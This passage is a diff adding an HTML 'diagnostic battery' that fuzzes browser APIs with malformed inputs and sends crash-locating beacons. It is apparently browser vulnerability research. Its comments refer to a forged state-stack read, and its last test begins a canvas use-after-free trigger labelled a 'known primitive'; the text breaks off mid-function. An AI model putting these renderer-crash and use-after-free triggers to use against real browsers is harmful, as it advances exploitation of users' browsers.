@@ -1,0 +1,853 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V2000 - All-in-One Diagnostic Battery</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:12px; }
+  h1 { color:#58a6ff; font-size:16px; margin:0 0 4px; }
+  p.sub { color:#8b949e; font-size:11px; margin:0 0 10px; }
+  table { width:100%; border-collapse:collapse; font-size:11px; }
+  td { padding:4px 6px; border-bottom:1px solid #1c2430; vertical-align:top; }
+  td.id { color:#58a6ff; white-space:nowrap; }
+  td.res { color:#9fb0c0; word-break:break-all; }
+  .ok { color:#3fb950; }
+  .err { color:#f85149; }
+  .run { color:#d29922; }
+  #bar { color:#8b949e; font-size:11px; margin:8px 0; }
+  button { background:#1f6feb; color:#fff; border:0; padding:8px 14px; border-radius:6px; font:inherit; }
+</style>
+</head>
+<body>
+<h1>V2000 - All-in-One Diagnostic Battery</h1>
+<p class="sub">Runs every safe surface test in one page. One beacon before and after each test, so a crash pinpoints the exact test.</p>
+<div id="bar">starting...</div>
+<button id="btn" onclick="location.reload()">Re-run</button>
+<table id="tbl"></table>
+<pre id="out" style="font-size:11px;white-space:pre-wrap"></pre>
+<script>
+/* V2000: All-in-one diagnostic battery.
+ *
+ * One page, one run, every safe surface we care about.
+ * Each test: V2000-START?d=<id> ... V2000-OK?d=<id> | V2000-ERR?d=<id>
+ * If the renderer dies, the last START without a result is the culprit.
+ *
+ * Excluded on purpose (they HANG the renderer, a JS timeout cannot save us):
+ *   - TransformStream writer.write()
+ *   - V650 forged m_stateStack read
+ *
+ * Beacon prefix: V2000-
+ */
+'use strict';
+
+var O = document.getElementById('out');
+var TBL = document.getElementById('tbl');
+var BAR = document.getElementById('bar');
+
+function say(s) { O.textContent += '\n' + s; }
+
+function bks(tag, body) {
+  var u = '/beacon/V2000-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 500)) +
+          '&t=' + Date.now() + '&s=1';
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', u, false);
+    x.send(null);
+  } catch (e) {
+    try { new Image().src = u; } catch (e2) {}
+  }
+}
+
+function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
+function fmt(v) {
+  if (v === null) return 'null';
+  if (v === undefined) return 'undef';
+  if (typeof v === 'number') return (isFinite(v) ? String(v) : 'nonfinite');
+  return String(v).slice(0, 40);
+}
+function withTimeout(p, ms, id) {
+  return new Promise(function (resolve, reject) {
+    var done = false;
+    var t = setTimeout(function () {
+      if (done) return;
+      done = true;
+      reject(new Error('TIMEOUT'));
+    }, ms);
+    Promise.resolve(p).then(function (v) {
+      if (done) return;
+      done = true; clearTimeout(t); resolve(v);
+    }, function (e) {
+      if (done) return;
+      done = true; clearTimeout(t); reject(e);
+    });
+  });
+}
+
+/* ---------------- deterministic PRNG ---------------- */
+var seed = 0x1420;
+function srnd() { seed = (seed * 1103515245 + 12345) & 0x7fffffff; return seed / 0x7fffffff; }
+function spick(a) { return a[Math.floor(srnd() * a.length) % a.length]; }
+function snum(n) { return Math.floor(srnd() * n); }
+
+var NS = 'http://www.w3.org/2000/svg';
+
+/* ---------------- test registry ---------------- */
+var TESTS = [];
+function T(id, name, fn, budget) { TESTS.push({ id: id, name: name, fn: fn, budget: budget || 12000 }); }
+
+/* =========================================================
+ * 1. CAPABILITIES
+ * =======================================================*/
+T('CAPS', 'Capability snapshot', function () {
+  var names = [
+    'MediaSource', 'SourceBuffer', 'BroadcastChannel', 'caches',
+    'localStorage', 'sessionStorage', 'FileReader', 'Blob', 'URL',
+    'ImageBitmap', 'createImageBitmap', 'OffscreenCanvas', 'transferToImageBitmap',
+    'Animation', 'KeyframeEffect', 'DocumentTimeline',
+    'SVGSVGElement', 'ShadowRoot', 'customElements', 'WebSocket',
+    'Worker', 'SharedWorker', 'ReadableStream', 'WritableStream', 'TransformStream',
+    'structuredClone', 'MessageChannel', 'crypto', 'TextEncoder', 'TextDecoder',
+    'AudioContext', 'webkitAudioContext', 'OfflineAudioContext',
+    'WebGLRenderingContext', 'WebGL2RenderingContext', 'RTCPeerConnection',
+    'serviceWorker', 'indexedDB', 'WebAssembly', 'SharedArrayBuffer',
+    'ResizableArrayBuffer', 'navigator.gpu', 'FontFace', 'FontFaceSet',
+    'IntersectionObserver', 'ResizeObserver', 'MutationObserver', 'PerformanceObserver'
+  ];
+  var avail = [], miss = [];
+  for (var i = 0; i < names.length; i++) {
+    var n = names[i], yes = false;
+    try {
+      var path = n.split('.');
+      var cur = window;
+      for (var k = 0; k < path.length; k++) cur = cur[path[k]];
+      yes = (cur !== undefined && cur !== null);
+    } catch (e) { yes = false; }
+    if (yes) avail.push(n); else miss.push(n);
+  }
+  return 'avail=' + avail.length + ' [' + avail.join(',') + '] | miss=' + miss.length + ' [' + miss.join(',') + ']';
+}, 6000);
+
+/* =========================================================
+ * 2. CANVAS 2D BASICS
+ * =======================================================*/
+T('CANVAS_BASE', 'Canvas 2D operations', function () {
+  var c = document.createElement('canvas');
+  c.width = 64; c.height = 64;
+  var g = c.getContext('2d');
+  if (!g) return 'no-2d-context';
+  g.fillStyle = 'rgba(1,2,3,0.5)';
+  g.fillRect(0, 0, 64, 64);
+  g.strokeStyle = '#fff'; g.lineWidth = 3; g.strokeRect(2, 2, 60, 60);
+  var gr = g.createLinearGradient(0, 0, 64, 64);
+  gr.addColorStop(0, 'red'); gr.addColorStop(1, 'blue');
+  g.fillStyle = gr; g.fillRect(4, 4, 20, 20);
+  var rg = g.createRadialGradient(32, 32, 1, 32, 32, 30);
+  rg.addColorStop(0, '#0f0'); rg.addColorStop(1, '#000');
+  g.fillStyle = rg; g.fillRect(20, 20, 24, 24);
+  g.shadowBlur = 4; g.shadowColor = 'black';
+  g.beginPath(); g.arc(32, 32, 10, 0, Math.PI * 2); g.fill();
+  g.setLineDash([2, 3]); g.lineDashOffset = 1;
+  g.globalAlpha = 0.7; g.globalCompositeOperation = 'multiply';
+  g.save(); g.translate(5, 5); g.rotate(0.3); g.scale(1.1, 0.9); g.restore();
+  var id = g.getImageData(0, 0, 64, 64);
+  g.putImageData(id, 1, 1);
+  var url = c.toDataURL('image/png');
+  var blobOk = 'n/a';
+  try { c.toBlob(function (b) { blobOk = b ? b.size : -1; }, 'image/png'); } catch (e) { blobOk = 'E'; }
+  return 'ok dataUrl=' + url.length + ' px=' + (id.data[0] + ',' + id.data[1]) + ' blob=' + blobOk;
+});
+
+/* =========================================================
+ * 3. IMAGEDATA / PIXEL BUFFERS
+ * =======================================================*/
+T('IMAGEDATA', 'ImageData edge sizes', function () {
+  var out = [];
+  var sizes = [[1, 1], [0, 0], [2, 3], [64, 64], [257, 1], [1, 4096]];
+  for (var i = 0; i < sizes.length; i++) {
+    var w = sizes[i][0], h = sizes[i][1];
+    try {
+      var d = new ImageData(Math.max(1, w), Math.max(1, h));
+      out.push(w + 'x' + h + ':len' + d.data.length);
+    } catch (e) { out.push(w + 'x' + h + ':' + e.name); }
+  }
+  try { new ImageData(new Uint8ClampedArray(3), 1); out.push('bad:accepted'); }
+  catch (e) { out.push('bad:' + e.name); }
+  return out.join(' ');
+});
+
+/* =========================================================
+ * 4. IMAGEBITMAP LIFECYCLE (reduced)
+ * =======================================================*/
+T('IMAGEBITMAP', 'ImageBitmap lifecycle (60 iters)', function () {
+  if (typeof createImageBitmap !== 'function') return 'unavailable';
+  var PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+  function blob() {
+    var b = atob(PNG), u = new Uint8Array(b.length);
+    for (var i = 0; i < b.length; i++) u[i] = b.charCodeAt(i);
+    return new Blob([u], { type: 'image/png' });
+  }
+  function mk(w, h) {
+    var c = document.createElement('canvas'); c.width = w; c.height = h;
+    var g = c.getContext('2d'); if (g) { g.fillStyle = '#123'; g.fillRect(0, 0, w, h); }
+    return c;
+  }
+  var OPTS = [{}, { premultiplyAlpha: 'none' }, { imageOrientation: 'flipY' },
+              { resizeWidth: 2, resizeHeight: 2 }, { resizeWidth: 0 },
+              { resizeQuality: 'pixelated' }, { colorSpaceConversion: 'none' }];
+  var oc = null;
+  try { if (typeof OffscreenCanvas !== 'undefined') oc = new OffscreenCanvas(8, 8); } catch (e) {}
+
+  var chain = Promise.resolve();
+  var N = 60;
+  for (var i = 0; i < N; i++) {
+    (function (i) {
+      chain = chain.then(function () {
+        var mode = i % 5, o = OPTS[snum(OPTS.length)];
+        if (mode === 0) {
+          return createImageBitmap(mk(4, 4), o).then(function (b) {
+            try { b.close(); } catch (e) {}
+            try { mk(2, 2).getContext('2d').drawImage(b, 0, 0); } catch (e) {}
+            try { b.close(); } catch (e) {}
+          }).catch(function () {});
+        }
+        if (mode === 1) {
+          return createImageBitmap(blob(), o).then(function (b) {
+            try { b.close(); } catch (e) {}
+            return createImageBitmap(b, o).then(function (b2) { try { b2.close(); } catch (e) {} }).catch(function () {});
+          }).catch(function () {});
+        }
+        if (mode === 2) {
+          if (!oc) return null;
+          try {
+            var b1 = oc.transferToImageBitmap(); try { b1.close(); } catch (e) {}
+            var b2 = oc.transferToImageBitmap(); try { b2.close(); } catch (e) {}
+          } catch (e) {}
+          return null;
+        }
+        if (mode === 3) {
+          return createImageBitmap(mk(8, 8), o).then(function (b) {
+            try { b.close(); } catch (e) {}
+            try { if (typeof structuredClone === 'function') { var c2 = structuredClone(b); try { c2.close(); } catch (e) {} } } catch (e) {}
+          }).catch(function () {});
+        }
+        var list = [];
+        return createImageBitmap(mk(4, 4), o).then(function (b) {
+          list.push(b);
+          return createImageBitmap(mk(4, 4), o);
+        }).then(function (b) {
+          list.push(b);
+          while (list.length) { try { list.pop().close(); } catch (e) {} }
+        }).catch(function () {});
+      });
+    })(i);
+  }
+  return chain.then(function () { return 'iters=' + N + ' ok'; });
+}, 25000);
+
+/* =========================================================
+ * 5. SVG SMIL (reduced)
+ * =======================================================*/
+T('SMIL', 'SVG SMIL lifecycle (60 iters)', function () {
+  if (typeof SVGSVGElement === 'undefined' ||
+      typeof SVGSVGElement.prototype.setCurrentTime !== 'function') return 'unavailable';
+  var TARGETS = ['x', 'y', 'width', 'height', 'r', 'cx', 'cy', 'fill', 'opacity',
+                 'transform', 'd', 'points', 'offset', 'stroke-width', 'display'];
+  var VALUES = ['0', '1', '-1', '1e308', '1e309', 'NaN', 'Infinity', '', ' ',
+                '0 0 0', '1;2;3', 'url(#nope)', 'inherit', 'none', 'M0 0L1 1',
+                'rotate(1e309)', 'scale(0)', '1e-9999', '-0', '200%'];
+  var DURS = ['0s', '-1s', '0.001s', '1s', '1e9s', 'indefinite', 'auto', '', 'NaN'];
+  var BEG = ['0s', '-1s', 'click', 'indefinite', '0s;1s', '', '1e9s'];
+  var REP = ['indefinite', '-1', '0', '1', '1e9', 'NaN', ''];
+  var TAGS = ['animate', 'set', 'animateTransform', 'animateMotion', 'animateColor'];
+  var N = 60;
+
+  for (var i = 0; i < N; i++) {
+    var svg = document.createElementNS(NS, 'svg');
+    svg.setAttribute('width', '32'); svg.setAttribute('height', '32');
+    var kind = snum(5);
+    var el;
+    if (kind === 0) { el = document.createElementNS(NS, 'rect'); el.setAttribute('width', '8'); el.setAttribute('height', '8'); }
+    else if (kind === 1) { el = document.createElementNS(NS, 'circle'); el.setAttribute('r', '4'); }
+    else if (kind === 2) { el = document.createElementNS(NS, 'path'); el.setAttribute('d', 'M0 0L4 4'); }
+    else if (kind === 3) { el = document.createElementNS(NS, 'text'); el.textContent = 'x'; }
+    else { el = document.createElementNS(NS, 'linearGradient'); el.setAttribute('id', 'g' + i); }
+
+    var a = document.createElementNS(NS, TAGS[snum(TAGS.length)]);
+    a.setAttribute('attributeName', spick(TARGETS));
+    a.setAttribute('from', spick(VALUES));
+    a.setAttribute('to', spick(VALUES));
+    a.setAttribute('values', spick(VALUES) + ';' + spick(VALUES));
+    a.setAttribute('dur', spick(DURS));
+    a.setAttribute('begin', spick(BEG));
+    a.setAttribute('end', spick(BEG));
+    a.setAttribute('repeatCount', spick(REP));
+    a.setAttribute('fill', spick(['freeze', 'remove', 'bogus']));
+    a.setAttribute('calcMode', spick(['linear', 'discrete', 'paced', 'spline', 'bogus']));
+    el.appendChild(a);
+    svg.appendChild(el);
+    document.body.appendChild(svg);
+    try { svg.setCurrentTime(srnd() * 5); } catch (e) {}
+    if (i % 3 === 0) { try { svg.removeChild(el); } catch (e) {} try { svg.setCurrentTime(srnd() * 5); } catch (e) {} }
+    if (i % 4 === 0) { try { a.beginElement(); } catch (e) {} try { a.endElementAt(0); } catch (e) {} }
+    if (i % 5 === 0) { try { var cl = svg.cloneNode(true); document.body.appendChild(cl); cl.remove(); } catch (e) {} }
+    try { svg.pauseAnimations(); svg.unpauseAnimations(); } catch (e) {}
+    try { svg.remove(); } catch (e) {}
+  }
+  return 'iters=' + N + ' ok';
+}, 15000);
+
+/* =========================================================
+ * 6. SVG FILTERS (reduced)
+ * =======================================================*/
+T('SVG_FILTER', 'SVG filter primitives (40 iters)', function () {
+  var PRIMS = ['feGaussianBlur', 'feColorMatrix', 'feTurbulence', 'feDisplacementMap',
+               'feComposite', 'feMerge', 'feOffset', 'feBlend', 'feMorphology',
+               'feConvolveMatrix', 'feComponentTransfer', 'feFlood', 'feImage', 'feTile'];
+  var VALS = ['0', '-1', '1e9', 'NaN', '0.5', '', 'matrix(1 0 0 0 1 0 0 0 1 0 0 0 1 0 0 0 1)',
+              '1 2 3', 'fractalNoise', 'stitch', 'none', 'source-over'];
+  var N = 40;
+  for (var i = 0; i < N; i++) {
+    var svg = document.createElementNS(NS, 'svg');
+    svg.setAttribute('width', '32'); svg.setAttribute('height', '32');
+    var defs = document.createElementNS(NS, 'defs');
+    var f = document.createElementNS(NS, 'filter');
+    f.setAttribute('id', 'f' + i);
+    var p = document.createElementNS(NS, spick(PRIMS));
+    p.setAttribute('in', spick(['SourceGraphic', 'SourceAlpha', 'BackgroundImage', 'nope']));
+    p.setAttribute('result', 'r' + i);
+    p.setAttribute('stdDeviation', spick(VALS));
+    p.setAttribute('values', spick(VALS));
+    p.setAttribute('k1', spick(VALS));
+    p.setAttribute('radius', spick(VALS));
+    p.setAttribute('baseFrequency', spick(VALS));
+    p.setAttribute('numOctaves', spick(['1', '0', '-1', '1e9', 'x']));
+    p.setAttribute('order', spick(['1', '0', '-1', '99', 'x']));
+    f.appendChild(p);
+    defs.appendChild(f);
+    svg.appendChild(defs);
+    var r = document.createElementNS(NS, 'rect');
+    r.setAttribute('width', '32'); r.setAttribute('height', '32');
+    r.setAttribute('filter', 'url(#f' + i + ')');
+    svg.appendChild(r);
+    document.body.appendChild(svg);
+    try { svg.getBBox(); } catch (e) {}
+    try { svg.remove(); } catch (e) {}
+  }
+  return 'iters=' + N + ' ok';
+}, 15000);
+
+/* =========================================================
+ * 7. MSE
+ * =======================================================*/
+T('MSE', 'MediaSource / SourceBuffer', function () {
+  if (typeof MediaSource === 'undefined') return 'unavailable';
+  var ms = new MediaSource();
+  var v = document.createElement('video');
+  var url = URL.createObjectURL(ms);
+  v.src = url;
+  return new Promise(function (resolve) {
+    var settled = false;
+    function fin(s) { if (settled) return; settled = true; try { URL.revokeObjectURL(url); } catch (e) {} resolve(s); }
+    ms.addEventListener('sourceopen', function () {
+      var out = [];
+      var sb = null;
+      try { sb = ms.addSourceBuffer('video/mp4; codecs="avc1.42E01E"'); out.push('sb=ok'); }
+      catch (e) { out.push('sb=' + e.name); }
+      if (sb) {
+        try { sb.appendBuffer(new Uint8Array([0, 0, 0, 8, 0x66, 0x74, 0x79, 0x70, 1, 2, 3])); out.push('append=queued'); }
+        catch (e) { out.push('append=' + e.name); }
+        try { sb.remove(0, 1e9); out.push('remove=ok'); } catch (e) { out.push('remove=' + e.name); }
+        try { sb.timestampOffset = -1; out.push('ts=-1'); } catch (e) { out.push('ts=' + e.name); }
+        try { sb.abort(); out.push('abort=ok'); } catch (e) { out.push('abort=' + e.name); }
+        try { ms.removeSourceBuffer(sb); out.push('rmsb=ok'); } catch (e) { out.push('rmsb=' + e.name); }
+      }
+      try { ms.endOfStream('network'); out.push('eos=ok'); } catch (e) { out.push('eos=' + e.name); }
+      fin(out.join(' '));
+    });
+    ms.addEventListener('sourceclose', function () { fin('sourceclose'); });
+    setTimeout(function () { fin('no-sourceopen'); }, 4000);
+  });
+}, 9000);
+
+/* =========================================================
+ * 8. STREAMS (readable only, TransformStream write excluded)
+ * =======================================================*/
+T('STREAMS', 'ReadableStream / WritableStream / tee', function () {
+  if (typeof ReadableStream === 'undefined') return 'unavailable';
+  var out = [];
+  var rs = new ReadableStream({
+    start: function (c) { c.enqueue(new Uint8Array([1, 2, 3])); c.close(); }
+  });
+  var rd = rs.getReader();
+  return rd.read().then(function (r) {
+    out.push('read1=' + (r.value ? r.value.length : 'x') + '/' + r.done);
+    return rd.read();
+  }).then(function (r) {
+    out.push('read2=' + r.done);
+    var s2 = new ReadableStream({ pull: function (c) { c.enqueue(1); c.close(); } });
+    var pair = s2.tee();
+    return Promise.all([pair[0].getReader().read(), pair[1].getReader().read()]);
+  }).then(function (a) {
+    out.push('tee=' + a[0].value + '/' + a[1].value);
+    if (typeof WritableStream === 'function') {
+      var chunks = [];
+      var ws = new WritableStream({ write: function (c) { chunks.push(c); } });
+      var w = ws.getWriter();
+      return w.write('a').then(function () { return w.write('b'); }).then(function () {
+        out.push('ws=' + chunks.join(''));
+        return w.close();
+      });
+    }
+    return null;
+  }).then(function () { return 'ok ' + out.join(' '); });
+}, 9000);
+
+/* =========================================================
+ * 9. WEB ANIMATIONS
+ * =======================================================*/
+T('WEB_ANIM', 'Web Animations lifecycle', function () {
+  if (typeof Element.prototype.animate !== 'function') return 'unavailable';
+  var el = document.createElement('div');
+  el.style.width = '10px'; el.style.height = '10px';
+  document.body.appendChild(el);
+  var anims = [];
+  for (var i = 0; i < 8; i++) {
+    try {
+      var a = el.animate(
+        [{ transform: 'translateX(0px)', opacity: 1 },
+         { transform: 'translateX(' + (i * 10) + 'px)', opacity: 0 }],
+        { duration: 100 + i, iterations: i % 2 ? Infinity : 1, fill: 'both', composite: i % 2 ? 'add' : 'replace' }
+      );
+      anims.push(a);
+    } catch (e) {}
+  }
+  var info = 'anims=' + anims.length;
+  try { anims[0].pause(); anims[0].currentTime = 50; } catch (e) {}
+  try { anims[1].reverse(); } catch (e) {}
+  try { anims[2].finish(); } catch (e) {}
+  try { anims[3].cancel(); } catch (e) {}
+  try { anims[0].effect.getComputedTiming().progress; info += ' timing=ok'; } catch (e) { info += ' timing=' + e.name; }
+  for (var k = 0; k < anims.length; k++) { try { anims[k].cancel(); } catch (e) {} }
+  try { el.remove(); } catch (e) {}
+  return info;
+});
+
+/* =========================================================
+ * 10. CACHE API
+ * =======================================================*/
+T('CACHE', 'CacheStorage put/match/delete', function () {
+  if (typeof caches === 'undefined') return 'unavailable';
+  var name = 'v2000_' + Date.now();
+  return caches.open(name).then(function (c) {
+    return c.put(new Request('/v2000/x'), new Response('hello', { status: 200 }))
+      .then(function () { return c.match('/v2000/x'); })
+      .then(function (r) { return r ? r.text() : 'miss'; })
+      .then(function (t) {
+        return c.delete('/v2000/x').then(function (d) {
+          return c.keys().then(function (ks) {
+            return caches.delete(name).then(function (cd) {
+              return 'put=ok match=' + t + ' del=' + d + ' keys=' + ks.length + ' cacheDel=' + cd;
+            });
+          });
+        });
+      });
+  }).catch(function (e) { return 'ERR ' + e.name; });
+}, 9000);
+
+/* =========================================================
+ * 11. BLOB / FILE / URL
+ * =======================================================*/
+T('BLOB', 'Blob slice / FileReader / objectURL', function () {
+  if (typeof Blob === 'undefined') return 'unavailable';
+  var parts = [];
+  for (var i = 0; i < 16; i++) parts.push('part' + i);
+  var b = new Blob(parts, { type: 'text/plain' });
+  var s = b.slice(3, 40, 'text/plain');
+  var u = URL.createObjectURL(b);
+  return new Promise(function (resolve) {
+    var fr = new FileReader();
+    fr.onload = function () {
+      var txt = fr.result;
+      var fr2 = new FileReader();
+      fr2.onload = function () {
+        URL.revokeObjectURL(u);
+        resolve('blob=' + b.size + ' slice=' + s.size + ' text=' + String(txt).length + ' ab=' + fr2.result.byteLength + ' url=' + u.slice(0, 5));
+      };
+      fr2.onerror = function () { resolve('fr2-err'); };
+      fr2.readAsArrayBuffer(s);
+    };
+    fr.onerror = function () { resolve('fr-err'); };
+    fr.readAsText(b);
+    setTimeout(function () { resolve('timeout'); }, 3000);
+  });
+}, 6000);
+
+/* =========================================================
+ * 12. BROADCASTCHANNEL
+ * =======================================================*/
+T('BROADCAST', 'BroadcastChannel round-trip', function () {
+  if (typeof BroadcastChannel === 'undefined') return 'unavailable';
+  return new Promise(function (resolve) {
+    var ch = new BroadcastChannel('v2000_' + Date.now());
+    var got = 0;
+    ch.onmessage = function (e) { got++; };
+    try { ch.postMessage({ a: 1, b: [1, 2, 3] }); } catch (e) {}
+    setTimeout(function () {
+      try { ch.close(); } catch (e) {}
+      resolve('msgs=' + got);
+    }, 300);
+  });
+}, 4000);
+
+/* =========================================================
+ * 13. CUSTOM ELEMENTS
+ * =======================================================*/
+T('CUSTOM_EL', 'Custom elements define/upgrade', function () {
+  if (typeof customElements === 'undefined') return 'unavailable';
+  var name = 'v2000-el-' + Date.now();
+  var calls = { c: 0, d: 0, a: 0 };
+  try {
+    customElements.define(name, class extends HTMLElement {
+      constructor() { super(); calls.c++; }
+      connectedCallback() { calls.c++; }
+      disconnectedCallback() { calls.d++; }
+      attributeChangedCallback() { calls.a++; }
+      static get observedAttributes() { return ['x']; }
+    });
+  } catch (e) { return 'define=' + e.name; }
+  var el = document.createElement(name);
+  el.setAttribute('x', '1');
+  document.body.appendChild(el);
+  el.setAttribute('x', '2');
+  el.remove();
+  return 'c=' + calls.c + ' d=' + calls.d + ' a=' + calls.a;
+});
+
+/* =========================================================
+ * 14. SHADOW DOM
+ * =======================================================*/
+T('SHADOW', 'ShadowRoot / slots', function () {
+  if (typeof Element.prototype.attachShadow !== 'function') return 'unavailable';
+  var host = document.createElement('div');
+  var root = host.attachShadow({ mode: 'open' });
+  root.innerHTML = '<slot></slot><b>t</b>';
+  var child = document.createElement('span');
+  child.textContent = 'x';
+  host.appendChild(child);
+  document.body.appendChild(host);
+  var kids = root.querySelectorAll('*').length;
+  var slot = root.querySelector('slot');
+  var assigned = 0;
+  try { assigned = slot.assignedNodes().length; } catch (e) {}
+  host.remove();
+  return 'nodes=' + kids + ' assigned=' + assigned;
+});
+
+/* =========================================================
+ * 15. FONT FACE
+ * =======================================================*/
+T('FONT', 'FontFace / FontFaceSet', function () {
+  if (typeof FontFace === 'undefined') return 'unavailable';
+  var out = [];
+  var ff = null;
+  try {
+    ff = new FontFace('V2000', 'url(data:font/woff2;base64,AAAA)');
+    out.push('ctor=ok');
+  } catch (e) { out.push('ctor=' + e.name); }
+  if (!ff) return out.join(' ');
+  return ff.load().then(function (f) {
+    out.push('load=ok');
+    return 'ok ' + out.join(' ');
+  }).catch(function (e) {
+    out.push('load=' + (e && e.name ? e.name : 'E'));
+    try { document.fonts.add(ff); } catch (e2) {}
+    try { document.fonts.delete(ff); } catch (e3) {}
+    try { out.push('check=' + document.fonts.check('12px V2000')); } catch (e4) {}
+    return out.join(' ');
+  });
+}, 6000);
+
+/* =========================================================
+ * 16. WORKER
+ * =======================================================*/
+T('WORKER', 'Blob Worker round-trip', function () {
+  if (typeof Worker === 'undefined') return 'unavailable';
+  var src = 'onmessage=function(e){postMessage(e.data+1)}';
+  var u = URL.createObjectURL(new Blob([src], { type: 'text/javascript' }));
+  return new Promise(function (resolve) {
+    var w = null;
+    try { w = new Worker(u); } catch (e) { URL.revokeObjectURL(u); resolve('spawn=' + e.name); return; }
+    var done = false;
+    w.onmessage = function (e) {
+      if (done) return; done = true;
+      try { w.terminate(); URL.revokeObjectURL(u); } catch (e2) {}
+      resolve('reply=' + e.data);
+    };
+    w.onerror = function () {
+      if (done) return; done = true;
+      try { w.terminate(); URL.revokeObjectURL(u); } catch (e2) {}
+      resolve('worker-error');
+    };
+    w.postMessage(41);
+    setTimeout(function () {
+      if (done) return; done = true;
+      try { w.terminate(); URL.revokeObjectURL(u); } catch (e2) {}
+      resolve('timeout');
+    }, 2500);
+  });
+}, 5000);
+
+/* =========================================================
+ * 17. STORAGE
+ * =======================================================*/
+T('STORAGE', 'localStorage / sessionStorage', function () {
+  var out = [];
+  try {
+    localStorage.setItem('v2000', 'x'.repeat(1024));
+    out.push('ls=' + localStorage.getItem('v2000').length);
+    localStorage.removeItem('v2000');
+  } catch (e) { out.push('ls=' + e.name); }
+  try {
+    sessionStorage.setItem('v2000', 'y');
+    out.push('ss=' + sessionStorage.getItem('v2000'));
+    sessionStorage.removeItem('v2000');
+  } catch (e) { out.push('ss=' + e.name); }
+  return out.join(' ');
+});
+
+/* =========================================================
+ * 18. CRYPTO
+ * =======================================================*/
+T('CRYPTO', 'crypto primitives', function () {
+  var out = [];
+  try {
+    var a = new Uint8Array(16);
+    crypto.getRandomValues(a);
+    out.push('rand=' + (a[0] + a[1]));
+  } catch (e) { out.push('rand=' + e.name); }
+  try { out.push('uuid=' + (crypto.randomUUID ? crypto.randomUUID().length : 'na')); }
+  catch (e) { out.push('uuid=' + e.name); }
+  if (crypto.subtle && crypto.subtle.digest) {
+    return crypto.subtle.digest('SHA-256', new Uint8Array([1, 2, 3])).then(function (h) {
+      out.push('sha=' + new Uint8Array(h).length);
+      return out.join(' ');
+    }).catch(function (e) { out.push('sha=' + e.name); return out.join(' '); });
+  }
+  out.push('subtle=na');
+  return out.join(' ');
+}, 6000);
+
+/* =========================================================
+ * 19. TEXT ENCODING
+ * =======================================================*/
+T('TEXT', 'TextEncoder / TextDecoder', function () {
+  var out = [];
+  try {
+    var enc = new TextEncoder().encode('\u00e9\u4e2d\ud83d\ude00');
+    out.push('enc=' + enc.length);
+  } catch (e) { out.push('enc=' + e.name); }
+  try {
+    out.push('dec=' + new TextDecoder().decode(new Uint8Array([0xff, 0xfe, 0x41, 0x00])));
+  } catch (e) { out.push('dec=' + e.name); }
+  try {
+    out.push('fatal=' + new TextDecoder('utf-8', { fatal: true }).decode(new Uint8Array([0xff])));
+  } catch (e) { out.push('fatal=' + e.name); }
+  return out.join(' ');
+});
+
+/* =========================================================
+ * 20. URL PARSER
+ * =======================================================*/
+T('URL', 'URL / URLSearchParams edge cases', function () {
+  var out = [], inputs = [
+    'http://x/../../a', 'https://[::1]:65536/', 'javascript:alert(1)',
+    'file:///c:/x', 'http://%zz/', 'http://x/%00', 'blob:http://x/y',
+    'data:text/html,<b>x</b>', 'http://x:0/', '//x/y', '?a=1&a=2&b=%zz'
+  ];
+  for (var i = 0; i < inputs.length; i++) {
+    try {
+      var u = new URL(inputs[i], 'http://base/');
+      out.push(u.protocol.replace(':', '') + '/' + u.pathname.length);
+    } catch (e) { out.push(e.name); }
+  }
+  try {
+    var p = new URLSearchParams('a=1&a=2&b=%zz');
+    out.push('sp=' + p.getAll('a').length + '/' + p.get('b'));
+  } catch (e) { out.push('sp=' + e.name); }
+  return out.join(' ');
+});
+
+/* =========================================================
+ * 21. CSS / COMPUTED STYLE
+ * =======================================================*/
+T('CSS', 'CSSOM / computed style / animations', function () {
+  var st = document.createElement('style');
+  st.textContent = '@keyframes v2k{from{opacity:1}to{opacity:0}}' +
+    '.v2c{--x:1;animation:v2k 1s infinite;color:rgb(1,2,3)}';
+  document.head.appendChild(st);
+  var d = document.createElement('div');
+  d.className = 'v2c';
+  document.body.appendChild(d);
+  var out = [];
+  try {
+    var cs = getComputedStyle(d);
+    out.push('op=' + cs.opacity + ' col=' + cs.color);
+    out.push('var=' + cs.getPropertyValue('--x').trim());
+  } catch (e) { out.push('cs=' + e.name); }
+  try { out.push('anim=' + d.getAnimations().length); } catch (e) { out.push('anim=' + e.name); }
+  d.remove(); st.remove();
+  return out.join(' ');
+});
+
+/* =========================================================
+ * 22. STRUCTURED CLONE / MESSAGECHANNEL
+ * =======================================================*/
+T('CLONE', 'structuredClone / postMessage transfer', function () {
+  var out = [];
+  try {
+    if (typeof structuredClone === 'function') {
+      var o = { a: 1, b: [1, 2, { c: 3 }] };
+      o.self = o;
+      try { structuredClone(o); out.push('cycle=accepted'); }
+      catch (e) { out.push('cycle=' + e.name); }
+      var ab = new ArrayBuffer(8);
+      var c = structuredClone(ab);
+      out.push('ab=' + c.byteLength);
+    } else out.push('sc=na');
+  } catch (e) { out.push('sc=' + e.name); }
+  try {
+    var mc = new MessageChannel();
+    var got = 0;
+    mc.port1.onmessage = function () { got++; };
+    var ab2 = new ArrayBuffer(16);
+    mc.port2.postMessage({ ab: ab2 }, [ab2]);
+    mc.port2.postMessage('x');
+    mc.port1.close(); mc.port2.close();
+    out.push('mc=sent');
+  } catch (e) { out.push('mc=' + e.name); }
+  return out.join(' ');
+});
+
+/* =========================================================
+ * 23. CANVAS UAF ALIAS (known primitive, last)
+ * =======================================================*/
+T('CANVAS_UAF', 'Canvas 2D/bitmaprenderer alias (16 ctx)', function () {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+
+  var savedCtx = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      savedCtx = ctx;
+      ctx.lineWidth = 3.14159;
+      ctx.miterLimit = 7.77;
+      ctx.globalAlpha = 0.42;
+      ctx.lineDashOffset = 2.222;
+      ctx.shadowBlur = 5.55;
